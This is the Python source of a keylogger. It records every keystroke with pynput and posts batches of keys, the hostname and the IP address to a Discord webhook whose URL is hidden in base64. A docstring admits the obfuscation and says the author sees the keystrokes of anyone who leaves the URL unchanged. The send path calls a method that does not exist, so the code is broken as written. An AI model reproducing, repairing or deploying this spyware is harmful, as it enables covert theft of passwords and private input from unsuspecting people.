try:
    import base64
    import json
    import asyncio
    import socket
    import requests
    import logging
    from datetime import datetime
    from pynput.keyboard import Key, Listener
except ImportError as error:
    raise error
finally:
    print("~Hello~")


class Keylogger:

    def __init__(self):
        super(Keylogger, self).__init__()
        self.pressed_keys = []
        """
        Replace {self.url} with your own Discord Webhook Url or where you want the log sent to.
            Pss. I encode it just in case it is looking too obvious to public
            so do replace, otherwise I can see your keyboard activity.
        """
        self.url = base64.b64decode(
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3OTQwMjQ1NjQzMzgyMzgwNi9mX1FEN05hWHViOU5RSWlWajJVYU05VzEtMGN5RG12UGgzRmZYOUZFYjVJbDFOLTdfWnlva1pvUEFfU3kxeFlFd3d4bQ=="
        ).decode("utf-8")

    async def payload_to_server(self, message):
        _machine_name_ = socket.gethostname()
        _ip_address_ = socket.gethostbyname(_machine_name_)
        _current_time_ = datetime.now().time()

        parameters = {
            "username": "Keylogger",
            "content": (
                f"***************\n"
                f"Timestamp: {_current_time_}\n"
                f"Machine Name: {_machine_name_}\n"
                f"Current IP: {_ip_address_}\n"
                f"Keyboard Input: {message}\n"
                f"***************"
            ),
        }

        try:
            response = requests.post(
                self.url,
                headers={"Content-Type": "application/json"},
                data=json.dumps(parameters),
            )

            logging.info(f"Payload sent  {response.status_code}")
        except Exception as e:
            logging.error(f"Failed to send payload: {e}")

    def log(self):
        with Listener(on_press=self.keyboard_pressed) as listener:
            listener.join()

    def keyboard_pressed(self, key):
        self.pressed_keys.append(str(key))
        logging.info(f"Keyboard Pressed => {str(key)}")

        if len(self.pressed_keys) > 20:
            asyncio.run(self.url_to_server(str(self.pressed_keys)))
            self.pressed_keys.clear()  # Clear the list after sending


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    keylogger = Keylogger()
    keylogger.log()
